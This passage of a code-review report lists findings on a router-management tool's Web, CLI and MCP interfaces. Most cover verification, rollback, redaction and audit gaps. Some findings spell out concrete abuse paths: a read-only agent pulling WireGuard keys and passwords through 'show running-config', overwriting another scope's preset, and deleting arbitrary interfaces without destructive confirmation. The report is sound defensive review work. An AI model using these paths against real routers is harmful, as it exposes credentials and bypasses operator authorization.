  - **Scope.** Bindings are unaffected (`has_binding`), and the Web uses the separate text reader.
  - **Backlog.** BACKLOG:38 lists only the two-readers duplication, not this failure mode.

D-07.title: Read-back cannot detect a no-op when the target already exists
D-07.rule: project rule (c) "a write the router accepts but does not apply fails"
D-07.impact:
Several cases pass verification without proving anything:
  - Rotating a peer PSK (`plan_wireguard_peer_psk`) on a peer that already has one.
  - Re-setting a PPP/IKE secret that already exists.
  - Adding a firewall rule identical to one already present.

  In each case, a router that silently ignores the write still passes. With duplicate rules, `Remove` can also fail verification falsely, because one copy is left.
D-07.fix: Snapshot before applying. For secrets, compare the opaque `ns3` payload before and after; it must change, and needs no decoding. For rules, compare the count before and after.
D-07.correction: This is a weakness in verification strength on re-set or duplicate paths, not a broken flow. For secrets, document it as a known limit, or compare payloads only when the old and new secret are known to differ.
D-07.reasoning: All three cited checks are presence-only, as the finding says. They cannot detect an ignored write when the target already existed. A false `Remove` failure with duplicate rules is real, but needs duplicates on the router. The fix for secrets is doubtful: if `ns3` encoding is deterministic, re-setting the same secret would then be reported as a failure.

D-08.title: Route removal is checked by routing-table row count, and the wipe recovery is lossy
D-08.rule: project rule (c); BRIEF "string matching on error names"
D-08.impact:
Several removals go wrong:
  - **Inactive route:** a static route whose gateway is down is not in `show ip route`. Its removal returns `RouteCountMismatch` even though it succeeded.
  - **Concurrent changes:** any DHCP or PPP route change between the two reads does the same.
  - **Interface-only routes:** in the "cleared" recovery, a route like `net mask Wireguard0` is planned with `gateway=Wireguard0` and fails validation. The `?` then aborts the restore loop, so the remaining routes stay deleted.
  - **Inactive routes during a wipe:** these are never restored at all.
D-08.fix: Verify absence of the exact command in `show rc`. Take the restore set from the running config, not the table, and restore every route before returning the first error.
D-08.reasoning:
- **Count check.** `apply_cli` already checks the line's absence through `verification::complete`. The extra `before - after == 1` routing-table count then gives false `RouteCountMismatch` for:
    - inactive routes (not in the table);
    - concurrent DHCP or PPP route changes.
  - **Lossy restore.** The restore treats a 3-word `command` as `[network, mask, gateway]`. An interface-only route fails `IpAddress` validation, and `?` aborts the loop with the other routes still deleted. Routes missing from the table are never restored.
  - **Inferred.** The real shape of the `show ip route` row `command` is inferred.

D-09.title: Segment create does not roll back the step that failed
D-09.impact: If the router accepts a step (for example `interface Bridge23 ip address …`) but the read-back does not match, `Bridge23` stays configured. kcc still returns `StepFailed`, whose doc says rollback ran. The test `bridge_failure_rolls_vlan_and_trunks_back` only covers a parse refusal.
D-09.fix: When the step's own request was sent, include that step in the rollback (run its delete line).
D-09.reasoning: `applied.push` runs only after `step::apply` returns `Ok`. A step that was sent and then failed the `context_has_child` check (or the `verification::complete` check inside `apply_cli`) is not rolled back. `apply_cli` itself does not undo anything. `StepFailed` is documented as "failed after any required rollback was attempted".

D-10.title: `RuleProperty::Order` can never be planned, and the Web builds its own order line
D-10.impact: The public variant (with its verifier at `verify.rs:141-156`) always fails. The working order path skips the domain planner and its identity verification.
D-10.fix: Map `Order` to the catalog's `new-index` argument and route the Web through it, or delete the variant.
D-10.correction: The cost is a dead public variant plus a hand-built Web line, with no unsafe value. Mapping to `new-index` first needs the catalog generator to emit that argument. Otherwise, delete the variant.
D-10.reasoning: `Order` produces `{"order":…}`, which is an `UnknownField` because the arguments are `{description, index, schedule}`. No caller uses the variant. The Web order path validates only `{index}`, but its extra values (`list` checked by `ObjectName`, `to` a `usize`) are safe, and the Web verifies with `Expect::At`. The fix as written also fails: `new-index` appears in the synopsis but not in the catalog's arguments.

D-11.title: VPN-client Delete removes any interface and drops the catalog's Destructive risk
D-11.impact: An MCP `vpn` call with `op=delete, name=ISP` (or `Bridge1`, or a Wi-Fi AP) deletes a non-VPN interface with `Write` only. Deleting `Bridge0` needs just `confirm:true`.
D-11.fix: Read the interface first and refuse names whose `type` is not a VPN client type. Keep `max(catalog risk, classified risk)`.
D-11.reasoning:
- **No type check.** MCP `vpn op=delete` accepts any ObjectName and sends `no interface X`.
  - **Risk is replaced.** `classify` overwrites the operation risk with Write or Management. The catalog marks `interface`+`no` as `Risk::Destructive` in `interface_node_risk`, but the workflow never reads per-request risk (only `Risk::Read` at `workflow.rs:999`).
  - **Consequence.** The destructive switch and the confirmation for destructive actions are bypassed.

D-12.title: VPN server status reads the crypto-map virtual IP at the wrong pointer
D-12.impact: Any configured IPsec virtual-IP server shows up as `{}`. The read only works if a map is literally named `virtual-ip`.
D-12.fix: Request `crypto map {}` and collect `virtual-ip` per map name.
D-12.reasoning: The verifier and the testkit projection both key maps by name (`/crypto/map/{name}/virtual-ip/...`). The reader asks for, and reads, `/crypto/map/virtual-ip`. So the Web tab shows `{}` unless a map is literally named `virtual-ip`.

D-13.title: Hand-written config-text walkers, duplicated and already drifted
D-13.impact: The parsers treat comments, indentation and nesting differently, so the same running config can verify as present in one domain and absent in another. A fix to one copy will miss the others.
D-13.fix: Use `kcc_config::config_text::parse`/`flatten` with one shared "find context and child" helper.
D-13.correction: This is a maintenance duplication only. The claim that one config could verify as present in one domain and absent in another is not demonstrated.
D-13.reasoning: The walker loop is duplicated. Most of the "drift" is deliberate: one walker checks presence, so it strips `ns3 ` and bounds the length; the other returns the stored form, so it keeps `ns3` and strips the IKE ` any`. No case is shown where the same config verifies differently across domains.

D-14.title: `RevealSecrets` gate is shipped with no production caller, and its scope check is not tied to the router
D-14.rule: BRIEF "dead or test-only code shipped in production"; project rule (d)
D-14.impact: This is a secret-reveal API with no audit hook. Its scope check trusts a caller-supplied name that is not bound to the `RouterCtx`, so a future caller can pass a name in scope with a context for a different router.
D-14.fix: Delete it until a surface needs it, or bind the router id inside `RouterCtx` and record an audit entry inside the gate.
D-14.correction: This is dead, latent API with a scope check that is not bound to the router. Delete it or bind the router id. Its present cost is low.
D-14.reasoning: There is no production caller, `RouterCtx` carries no router id, and the gate has no audit. `read_stored` returns the stored `ns3` representation, not plaintext. Today there is no consequence.

D-15.title: Validated requests are changed after validation
D-15.impact: `ChangeOp.requests[*].value` no longer matches what was validated. Any consumer that reads `.value` (plan previews, audit, classification) sees `{"line":…}`. The line itself, which is what gets sent, was never validated.
D-15.fix: Carry the line next to the `ValidatedRequest` in a typed struct, and never change `value` after validation.
D-15.correction: The "previews, audit, classification see `{line}`" impact is not shown. This is a design smell whose security cost is already counted in D-02.
D-15.reasoning: `value` is changed after validation, as stated. However, no consumer reads `ChangeOp.requests[*].value` of these ops before `request()` unpacks it. The audit sees the unpacked `arguments`, and the web and MCP code does not read these values for previews or classification. The real cost, a line that was never validated, is D-02.

D-16.title: WireGuard parse error can keep a raw key line in a `Debug`-derived error
D-16.rule: project rule (d) "never in … error text or Debug output"
D-16.impact: A pasted config with `PrivateKey: <key>` (colon typo), or a bare key line, produces `Malformed{field: "<key>"}`. Any `{error:?}` or `tracing` `?error` then prints the key. Today's surfaces use Display or ignore `field`, so this is latent.
D-16.fix: Store only the line number for `Malformed`.
D-16.correction: Store only the line number in `UnknownField`, `Malformed` and `Duplicate` (anything that can hold raw line text), or never derive `field` from unparsed text. This is a project rule (d) violation in Display error text.
D-16.reasoning: Base64 WireGuard keys end in `=`. A line such as `PrivateKey: <key>=` or a bare key line therefore does split on `=`, and inside a section it becomes `UnknownField { field: "<key without padding>" }`, not `Malformed`. The Display of `UnknownField` (`"unknown WireGuard field {field} …"`) prints the key, so it leaks through error text, not only `Debug`. `Malformed` with a key happens only before any section header. Today the Web ignores `field`, and only the Web calls the parser, so the leak is latent.

D-17.title: WireGuard ASC: the doc says extra values are ignored, but the line keeps them
D-17.impact: `kcc vpn wireguard-asc NAME v1 … v17` (`kcc/src/cli/dom_vpn.rs:185-187`) sends 17 words while 16 were validated. An `I1` value containing spaces (AmneziaWG's `<b 0x…>`) splits into several words.
D-17.fix: Refuse more than 16 values, and quote each value.
D-17.reasoning: The line uses every value joined with spaces, while the body zips at most 16. The doc's "ignored" claim is false, and values containing spaces split into several words.

D-18.title: Verification and validation failures turned into `InvalidResponse`
D-18.rule: project rule (c) "fails with a verification error naming the field"; RUST_GUIDELINES.md §2 "Propagate errors with `?`" (228)
D-18.impact: Users and audit see "invalid response" for a write that did not apply, or for their own bad port range, with no field named.
D-18.correction: The NAT read-back is at `nat/change.rs:90-92`, not 306-308.
D-18.reasoning: The pattern is real: failed read-backs and bad user port ranges return `InvalidResponse`. The NAT location is cited wrongly; that file has 167 lines.

D-19.title: The same planner helpers are copied across seven modules
D-19.impact: Fixes such as quoting (D-02) have to land in seven places.
D-19.fix: One crate-internal `plan_one(router, path, body, risk)` and one typed word renderer.
D-19.correction: The NAT copies are at `nat/change.rs:121-133` (`plan`) and `156-163` (`push`).
D-19.reasoning: The duplication exists as described, but the NAT line numbers point past the end of the file.

D-20.title: One stray `kcc-segment:` description breaks segment discovery
D-20.impact: Any interface description starting with `kcc-segment:` that is malformed or on the wrong interface fails `read_segments`, so the whole Segments view goes down.
D-20.fix: Skip and log a bad record instead of failing the entire read.
D-20.reasoning: Any `description kcc-segment:…` line that fails JSON or ownership checks, or sits under a context other than `interface VlanN`, fails the whole `read_segments`. Any user with Write can set such a description through ordinary interface or policy descriptions.

D-21.title: Planners signal invalid input through sentinels and string dispatch
D-21.impact: An invalid end/size combination surfaces as `UnknownField{"invalid"}` with a nonsense nearest-match suggestion.
D-21.fix: Return a typed error, and take an enum for the server kind.
D-21.reasoning: `{"invalid":true}` is used as a sentinel, and the `_ => ""` string dispatch is as cited. The `""` arms cannot be reached with the fixed callers, but the sentinel can (MCP pool with neither `end` nor `size`).

D-22.title: Dead branches and phantom inventory entries
D-22.impact: The tool descriptions advertise operations that cannot run, and the code suggests IPv6 support that does not exist.
D-22.correction: Only the dead IPv6 `parse_prefix` branch remains. The "tool descriptions advertise operations that cannot run" impact is false.
D-22.reasoning: The IPv6 branch of `parse_prefix` is dead, because `IpMask` accepts only IPv4 masks. However, `ipv6_rule` is filtered by `available()` (no catalog has the path), MCP does not offer it (`FIREWALL_OPS = ["rule","binding"]`), and the CLI lists it as a documented exclusion. E-01.title: MCP secret redaction is a weaker, separate denylist from the Web and kcc-config ones, and it skips text bodies
E-01.rule: project rule (d); overlay mcp-servers.md "Tool inputs are untrusted" / core §10
E-01.impact: An agent with a viewer key calls `kcc_rci_read {catalog_path:"show running-config"}` or reads a WireGuard/IAPP setting. It gets the `ns3` blobs, the `wireguard private-key` value, the `iapp key` and plaintext lines such as `web-api password`, none of which go through `RevealSecrets`. The same read in the Web explorer is masked.
E-01.fix: Move one secret-name classifier (Web's `is_secret`) into a shared crate and use it in `redact_secrets`. Run text and `message` line arrays through `kcc_config::secrets::redact` plus the ns3 mask, or refuse `show running-config` in `rci_read`.
E-01.correction: The MCP leak stands. The Web explorer has the same `show running-config` gap, logged below as NEW-1. Masking JSON members by name differs between the two front ends. The text and line leak is common to both. The fix should be one shared classifier, plus config-text redaction (or a `RevealSecrets` gate) for `show running-config` and related reads in both front ends.
E-01.reasoning:
- The code gap is real. `kcc_rci_read` is a `core` tool that needs only `Permission::Read`. It accepts `show running-config`, which the catalog lists as a `Show` command with no arguments. The tool returns the router body after only `redact_secrets`.
  - That denylist uses substrings. It misses `key`, `private-key`, `obfs-key`, `community` and `pin`, all of which the Web `is_secret` catches. It also never looks inside string values, so config lines in a text body or a `message` array pass through unchanged.
  - The backup diff for the same Read principal goes through `kcc_config::secrets::redact` plus the ns3 mask. README:213-215 and rule (d) promise redacted MCP results, and only `RevealSecrets` may reveal secrets. So a Read principal can get ns3 blobs and plaintext secret lines, which the backup diff hides from the same principal.
  - The finding's comparison is wrong in one place. The Web explorer does not mask this read either. A Read user runs `show running-config` through `read_root`, and Web `mask` changes only member values whose names match. `Rendered::text` returns text bodies unmasked. So "the same read in the Web explorer is masked" holds only for JSON members named like secrets.

E-02.title: `kcc_preset_capture` overwrites any stored preset by name slug, skipping the source-scope check
E-02.rule: overlay http-services authz; project scope model
E-02.impact: A `lab-*` identity with `Migrate` captures `{"source":"lab-src","name":"Office",...}` and silently replaces the `office` preset that an admin captured from `prod-1`. A later `kcc_preset_apply office` on prod then pushes lab settings to prod, and prod-scoped users lose the preset. This is a write to an out-of-scope object that `delete` would refuse.
E-02.fix: Have `PresetStore::capture` refuse an existing id (or require the old record's source scope plus an explicit replace flag). In MCP, either give the slug a random suffix or return `conflict` when the id exists.
E-02.correction: n/a. The root cause is in `PresetStore::capture`, so the store-level fix covers the CLI too.
E-02.reasoning:
- MCP checks `Migrate` only on the new source router. It then derives the id as `slug(name)`.
  - `PresetStore::capture` runs `validate_id` and `authorize_source(role, new source)`, then `save`, which writes a temp file and does `fs::rename` over `<id>.json`. It never reads the existing record or checks that record's `source_router`.
  - `delete` and `get_for_apply` do check the existing record's scope. So a `lab-*` Migrate identity can replace a preset sourced from `prod-1`. Prod-scoped users then lose access, because `authorize_source` on the new record fails for them. The old preset content is gone (data loss).
  - The Web avoids this with `fresh_id`. The CLI has the same overwrite: it passes `name` as the id.

E-03.title: An applied migration or preset holds the router write lease indefinitely, and records are never evicted
E-03.rule: core §5 "Audit Drop impls of async resources"; BRIEF item 1 (unbounded growth)
E-03.impact: An agent (or a built-in operator, which cannot roll back) applies and then stops. Every Web, CLI and MCP write to that router gets `RouterBusy`/`conflict` until `kcc serve` restarts. Only the same identity can finish, and an admin cannot. Each `kcc_migration_plan` call with different `exclude` sets adds an entry that keeps a whole `MigrationPlan` (secret buffers) in memory for the life of the process.
E-03.fix: Give records a TTL tied to the armed timer: after the router's timer window, close and drop the `Applier`. Evict unapplied plans by age and count. Allow a `Destructive` holder on the target to finish another identity's migration.
E-03.correction: Restate it as: MCP has no recovery path for an abandoned apply (owner-only finish, no TTL), and its plan map grows without bound. A lease TTL tied to the armed timer belongs in the shared design, because the Web has the same retention.
E-03.reasoning:
- Confirmed in the code:
    - The `Applier` keeps the router lease until commit, rollback or process exit.
    - The map entries have no TTL and are never removed.
    - `routers_for` refuses any identity other than the owner, so an admin cannot finish another identity's migration.
    - The map is process-wide, because `handler.clone()` shares the `Arc`.
    - Unapplied plans accumulate.
  - Two corrections. Holding the lease indefinitely is the shared `Applier` design ("dropping leaves router recovery armed"), and the Web wizard keeps it the same way: `Wizards::session` evicts only sessions with no live apply. The parts specific to MCP are owner-only finishing and never evicting unapplied plans.

E-04.title: Result truncation replaces the whole payload, including error codes and fail-safe messages, and returns a meaningless cursor
E-04.impact: A confirmed 64-item `kcc_rci_batch` whose disarm fails returns `BatchFailSafeArmed` with every response included. If that is over 32 KiB, the agent gets `is_error` with no `error` code, no `management_applied_fail_safe_armed` message and no per-item outcomes. A successful large write loses `unsaved`, `persists_immediately`, `audit_pending` and the notice. `"next_cursor":"1"` is meaningless for tools without a cursor (`rci_read`, `backup_diff`), and on paged tools it advances by one item.
E-04.fix: Always keep `error`, `message`, `field`, `unsaved`, `persists_immediately` and `audit_pending`, and truncate only the bulky array. Emit a real next offset only for tools that take `cursor`.
E-04.reasoning:
- Above the cap, `shape` replaces the whole value with `{"truncated":true,"next_cursor":"1","request_id":...}`.
  - The failure reply goes through the same `shape`, so `error`, `message`, `field` and the completion of a `BatchFailSafeArmed` are all lost. The client gets `is_error` with no code.
  - The default cap is 32 KiB. A batch completion carries every response, so this is reachable.
  - `"1"` is meaningless as a cursor for tools that take no cursor.

E-05.title: `redact_clients_in_mcp` misses client names, free text and progress notifications
E-05.impact: With redaction on, `kcc_clients_read` still returns names such as "Anna's iPhone". System log lines (`kcc_diagnostics_read`) and CLI text bodies still contain raw MACs and IPs. An `arping` call with a progress token streams client MACs unredacted.
E-05.fix: Add `name` under client objects. Scrub MAC and IP patterns inside strings. Pass progress messages through the same pseudonymizer.
E-05.reasoning:
- `PrivacyConfig` says the setting pseudonymizes "host names", but `Client.name` ("Registered host name") does not match any key needle and passes through.
  - Arping progress lines are JSON strings containing `mac` and `address`. They are sent through `progress.notify` without going through `shape`.
  - Strings that embed a MAC are not matched, because `looks_like_mac` needs the whole value to be the MAC.

E-06.title: The global migrations mutex is held across router commit and rollback
E-06.impact: While one router's commit or rollback runs (save, disarm, or a reboot-wait rollback on an extender), every other `kcc_migration_*`/`kcc_preset_apply` call for every router and identity waits on this lock. `reviewed()` (`apply.rs:94`), `report` (`finish.rs:114`) and `record` (`state.rs:178`) all take it.
E-06.fix: Wrap each `Migration` in `Arc<tokio::sync::Mutex<…>>`. Take the map lock only to clone the entry handle, then lock the entry for the I/O.
E-06.correction: This is not a guideline violation. It is a contention issue on an uncommon path. A per-entry lock is the fix.
E-06.reasoning:
- The cited rule does not apply. §5 is about `std::sync::Mutex` and says explicitly "use tokio::sync::Mutex if you must hold across await". This lock is a `tokio::sync::Mutex`.
  - What remains is a design point. One global map lock is held across commit and rollback I/O, which can include a reboot wait. During that time it blocks plan recording, apply recording and report calls for every router.

E-07.title: Every interface write failure becomes `conflict`, losing `verification_failed` and its field
E-07.rule: project rule (c); the documented error contract (`registry/docs.rs:44-47`)
E-07.impact: A `description` or `security_level` change the router accepts but does not apply returns `conflict` with no `field`, and so do forbidden, unreachable and rejected outcomes. The test hides it: `tests/support/interface_refusals.rs:71-73` only checks `reply.error().is_some()`.
E-07.fix: Expose a mapping accessor on `InterfaceChangeError` (Domain/Workflow) and route it through `map_domain`/`map_workflow`.
E-07.reasoning:
- Every `InterfaceChangeError` becomes `Conflict`. This includes `WorkflowError::VerificationFailed { field }`, permission refusals and router errors.
  - The type exposes only `is_fail_safe_unarmed`, so MCP cannot map the error any better without a change in the domain crate.
  - This breaks rule (c) and the documented `verification_failed` + `field` contract.

E-08.title: Several successful MCP actions are not audited, although the Web and CLI audit the same actions
E-08.rule: project change and audit model (README "Safety model"); BRIEF item 2
E-08.impact: An agent can create backups, cancel another user's migration job, and overwrite or delete presets (see E-02) with no trace in `audit.jsonl`.
E-08.fix: Append a success `AuditEvent` on these paths, as the Web/CLI equivalents do.
E-08.reasoning: The route wrapper audits failures only. None of the cited success paths writes an audit entry. The Web and CLI audit the equivalent actions (backup create, job cancel, preset capture, diagnostic start).

E-09.title: Logged failure causes cannot be tied to the `request_id` returned to the client
E-09.rule: overlay mcp-servers.md "Errors on the wire": "cause is logged server-side with enough context to correlate the two, for example a request id"
E-09.impact: With concurrent calls, the operator cannot match the logged cause to the `request_id` the client saw.
E-09.fix: Mint the id in `route()` / the `#[tool]` wrappers before the work and open a `tracing::info_span!("mcp_tool", request_id, tool)` around it.
E-09.reasoning:
- The id is created after the work has run. Causes are logged earlier without it. rmcp instruments the handler with the loop span only.
  - The overlay rule is quoted correctly: the cause must be logged "with enough context to correlate". So this is a genuine violation.
  - The cost is limited to concurrent calls: the cause line and the code line are adjacent in the same task. That is a minor operability cost.

E-10.title: Crate-root `#![expect]` blankets 8 clippy lints plus private-item docs
E-10.rule: AGENTS.md "No `#[allow]` … `#[expect]` on the narrowest item"; BRIEF item 4
E-10.impact: Any new unchecked arithmetic anywhere in the crate passes silently. For example, `generic/fleet.rs:155` `(offset + limit).to_string()` uses a user-controlled offset.
E-10.fix: Move each expectation to the specific item that triggers it, and use `checked_add`/`saturating_add` at fleet.rs:155.
E-10.correction: Remove the example and the "no other crate" claim. What remains is a lint-scope violation with no demonstrated bug.
E-10.reasoning:
- The blanket crate-root `#![expect]` covering 8 lints, plus `missing_docs_in_private_items`, does go against "#[expect] on the narrowest item".
  - Two corrections. `kcc-domain` also has a crate-root `#![expect(clippy::missing_errors_doc)]`, so "no other crate root does this" is false. The `offset + limit` example cannot overflow: `results.len() == limit > 0` requires `offset` below the catalog size, and when `limit == 0` it adds 0.
  - The real cost is that `arithmetic_side_effects` is silenced for the whole crate. No overflow has been demonstrated.

E-11.title: About 70 async fns have no cancel-safety annotation, including mutating handlers
E-11.rule: core §5 "DO: Annotate every async fn with cancel safety" (`RUST_GUIDELINES.md:1188-1237`)
E-11.impact: These write the router or state and carry no stated contract. BACKLOG names only 10 such fns in other crates; `xtask cancel-safety` checks `pub` items only.
E-11.fix: Add `// NOT cancel-safe:` / `// cancel-safe:` comments and extend the xtask to `pub(crate)` and private items.
E-11.correction: These are new instances of a known BACKLOG class. Add them to that item, or annotate them.
E-11.reasoning: The count and the rule are accurate. The same class of gap is already tracked in BACKLOG:77 for other crates. BACKLOG:43 records that rmcp runs each call in a detached task that kcc never cancels, so the practical risk now is documentation drift.

E-12.title: The `fields` projection argument is accepted and validated but never applied
E-12.rule: core §8 API design; overlay "tool inputs" (schema honesty)
E-12.impact: Agents asking for projections get full payloads, which then hit truncation (E-04). A router answer with a top-level `fields` key would be pruned unpredictably.
E-12.fix: Remove `fields` from the schemas and from `shape`, or pass the parsed input into `shape` and project the result's item arrays.
E-12.reasoning:
- `fields` is read from the output value, but no tool emits `"fields"`. The input `fields` values are validated and then dropped, so the schema promises a projection that never happens.
  - The "router key pruned" sub-claim is weak, because `rci_read` wraps the router answer under `value`.

E-13.title: The pseudonymizer over-matches on the substring "ip", and its map grows without bound
E-13.impact: `"description"` contains "ip", so interface, system and policy descriptions and every JSON Schema `description` in `kcc_catalog_describe` and catalog resources become `client-N`. NAT session pages add thousands of permanent map entries.
E-13.fix: Match whole key tokens (`key == "ip"` or split on `-`/`_`), and bound or session-scope the map.
E-13.reasoning:
- `"description"` contains `"ip"`, so every description string becomes `client-N` when redaction is on. This includes the schema descriptions from catalog describe.
  - There is one map, shared through `Arc` across every session clone, and nothing ever evicts entries.

E-14.title: Tool metadata and helper logic are duplicated and can drift
E-14.impact: Editing one copy changes the wire annotations without changing the docs, or changes the backup-diff redaction without changing the CLI download.
E-14.fix: Generate `#[tool]` metadata from `generic()` (or register generic tools through `route()`), and share the ns3 mask from `kcc-config`.
E-14.reasoning: Every duplicate exists as cited. The wire annotations of the generic tools come from `#[tool]`, while the RBAC specs and docs come from `definitions`. No test compares the two.

E-15.title: Stringly-typed dispatch with wildcard fallbacks binds unknown names to real handlers
E-15.rule: core §3 "Use exhaustive match / enums instead of strings"
E-15.impact: A new description added to `descriptions()` is silently served by `backups::diff` (or the last op handler), with its own name and permission.
E-15.fix: Use enums for tools and ops (serde `rename_all`), and match them exhaustively.
E-15.reasoning: Tool-name dispatch ends in a `_` arm that serves `backups::diff`, so an added description would be bound to the wrong handler. The op-level wildcards are guarded by `check_op`, so only the tool-name dispatch matters here.

E-16.title: Debug formatting is used as a wire value, and a test pins it
E-16.rule: core §13 "DON'T: Assert on Debug output as a stable format"
E-16.impact: Renaming a variant or changing a derive in kcc-catalog or kcc-rci silently changes the MCP wire.
E-16.reasoning: `{:?}` output is used as a wire value, and a test pins it. The guideline says "Debug is not an output format" (`use_debug` rationale, §13).

E-17.title: Recovery mapping decides meaning by comparing an i18n message key
E-17.rule: BRIEF item 4 (string matching on error names)
E-17.impact: Rewording or splitting the message key changes the wire code and the audit classification.
E-17.fix: Have `recovery::Failure` expose a typed fate such as `NotApplied`.
E-17.reasoning:
- `Failure` keeps `sent` private, so MCP infers "not applied" from `message_key()`.
  - Rewording the message text does not break this, because both sides use the same constant. Splitting or reassigning the key does break it.

E-18.title: Input schemas call `confirm` "unused", but it is required for some writes
E-18.impact: An agent following the schema gets `confirm_required` on a firewall binding to the management interface.
E-18.fix: Document `confirm` as "required when the change touches management", and drop `index`/`description`.
E-18.reasoning: `confirm` is passed to `confirm_risk` and is required for Management risk. The `index` and `description` fields are documented but always refused.

E-19.title: `resources/read` maps router failures to `internal`, skips the audit, and starts pollers for unregistered names
E-19.impact: An unreachable or unknown router returns `internal`, while the tools return `router_unreachable`. Scope refusals here are never audited, unlike the tool path. A `"*"`-scoped caller can make the server spawn one poll task per arbitrary valid name (`kcc-app/src/poller.rs:224-230`).
E-19.fix: Check registry membership first, map poll errors to `RouterUnreachable`, and audit `Forbidden`.
E-19.reasoning:
- Confirmed: a poll error becomes `internal` rather than `router_unreachable`, and a resource-path `Forbidden` is not audited.
  - Correction: the poller started for an unknown name idles out after `intervals.idle` and removes its channel. That sub-claim is therefore bounded.

E-20.title: `catalog_search` with `limit: 0` returns a `next_cursor` equal to the current cursor
E-20.impact: An agent following `next_cursor` loops forever on empty pages.
E-20.fix: Clamp the limit to `1..=100`, as the migration tools already do (`finish.rs:112`).
E-20.reasoning: With `limit: 0`, `results.len() == 0 == limit`, so `next_cursor` comes back equal to the current offset. An agent following it loops forever.

E-21.title: `kcc_diagnostics_write` is registered as a read-only Read tool
E-21.impact: Under `[mcp] read_only = true`, a viewer can still make the router run iperf3, ping or traceroute to arbitrary hosts, which is real traffic generation. Starting these jobs is not audited (E-08).
E-21.fix: Classify diagnostics as at least `Write`/non-read-only, or document the choice as an owner decision.
E-21.reasoning:
- This is a documented design choice, not a defect. The domain declares the diagnostics `Risk::Read` and `Permission::Read`.
  - The Web states the same policy: "The domain describes the diagnostics as reads: whoever may read the router may run them." MCP's read-only flag follows that shared classification.
  - The missing audit entry is already covered by E-08.

E-22.title: The unvalidated CLI escape is not recorded as a deviation from project rule (b)
E-22.rule: project rule (b) "Every … CLI line … is validated against kcc-catalog"
E-22.impact: An admin agent can send any CLI line with an unknown prefix. It is classified Management, not Destructive, so it needs no `Destructive` permission.
E-22.fix: List it as an open deviation in the project overlay, or classify unvalidated lines as Destructive.
E-22.reasoning:
- Lines the catalog cannot map are sent unvalidated for RawRci+ManageRouters callers, classified Management. This contradicts rule (b) as written.
  - It is documented only in the MCP tool docs, not as an overlay deviation. The Web CLI console has the same escape.

E-23.title: Test quality: tautologies, tests that pin known-broken behavior, and review labels
E-23.impact: These tests cannot catch the bugs above, and some actively lock them in.
E-23.fix: Assert specific codes per input class, fix the fake rather than pinning it, and drop task labels from test code.
E-23.correction: Keep the `random.rs`, `gates.rs:196` and `interface_refusals` items. Drop the evidence-path, Bridge0 and caps items.
E-23.reasoning:
- These sub-claims hold:
    - The `matches!` in `random.rs` is close to a tautology: it accepts anything except `BatchFailSafeArmed`.
    - `gates.rs:196` pins the meaningless cursor from E-04.
    - `interface_refusals` accepts any error, which hides E-07.
  - These sub-claims do not hold:
    - The `.omo/evidence/task-<N>-…` path is mandated by AGENTS.md "Evidence".
    - Whether a real router deletes `Bridge0` is an open hardware question in BACKLOG:17, so the fake's read-back is not a known bug.
    - The `<= 25`/`<= 70` checks are deliberate registry caps.

E-24.title: Some write paths drop the audit receipt, so `audit_pending` is never reported
E-24.impact: Under a held audit lock, these writes claim a completed audit, while `kcc_rci_execute` correctly returns `audit_pending: true`.
E-24.correction:
Fix the system paths in MCP. The VPN-secret paths first need the domain functions to return their change result.
